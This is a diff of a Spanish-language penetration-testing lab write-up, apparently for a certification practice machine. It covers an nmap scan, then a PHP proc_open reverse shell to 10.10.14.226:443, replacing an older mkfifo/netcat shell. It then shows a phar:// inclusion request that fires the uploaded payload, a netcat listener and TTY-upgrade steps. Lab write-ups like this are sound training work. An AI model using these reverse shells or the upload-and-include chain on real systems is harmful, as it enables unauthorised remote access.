@@ -1,3 +1,6 @@
+#CPTS 
+
+
 ```shell
 nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.49.90 -oG allPorts
 ```
@@ -241,29 +244,49 @@ $descriptorspec = array(
    2 => array("file", "/tmp/error-output.txt", "a") 
 );
 
-$cwd = '/tmp';
-$env = array('some_option' => 'aeiou');
+$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.226/443 0>&1'";
 
-$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
+$process = proc_open($shell, $descriptorspec, $pipes);
 
-if (is_resource($process)) {
-
-    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 1337 >/tmp/f');
-    fclose($pipes[0]);
-    echo stream_get_contents($pipes[1]);
-    fclose($pipes[1]);
-    $return_value = proc_close($process);
-
-    echo "command returned $return_value\n";
-}
 ?>
 ```
 
 Tendremos que modificar la IP y el puerto.
 A continuación lo comprimimos de nuevo, cambiamos la extensión y lo subimos.
+```php
+?page=phar://uploads/5d9cb91d6c3837c9cc454654bb2016ff/cmd.pwned/cmd
+```
+
 Nos pondremos en escucha en el puerto indicado y recibiremos una reverse shell
+```shell
+nc -nlvp 443
+```
 
+En la shell que hemos recibido somos `www-data`
+Lo primero que deberemos de hacer es un tratamiento de la shell para poder operar en una tty
+```shell
+script /dev/null -c bash
+```
+```shell
+crtl + z
+```
+```shell
+stty raw -echo; fg 
+```
+```shell
+reset xterm
+```
+```shell
+export TERM=xterm
+```
+```shell
+export SHELL=/bin/bash
+```
 
+Ajustaremos filas y columnas
+```shell
+stty rows 49 columns 236
+```
 
 
 
